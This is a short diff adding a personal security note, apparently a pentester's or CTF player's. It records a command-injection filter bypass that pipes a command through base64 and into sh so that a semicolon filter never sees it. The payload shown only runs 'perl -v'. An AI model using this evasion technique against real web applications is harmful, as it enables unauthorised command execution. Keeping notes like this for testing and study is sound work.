@@ -1,0 +1,4 @@
+##
+semi-colon (;) was filtered by web app w/ command injection vuln, but this bypassed:
+echo "perl -v" | base64 | base64 -d | sh
+*Can't recall the significance of the base64, but i saved it b/c it was helping..
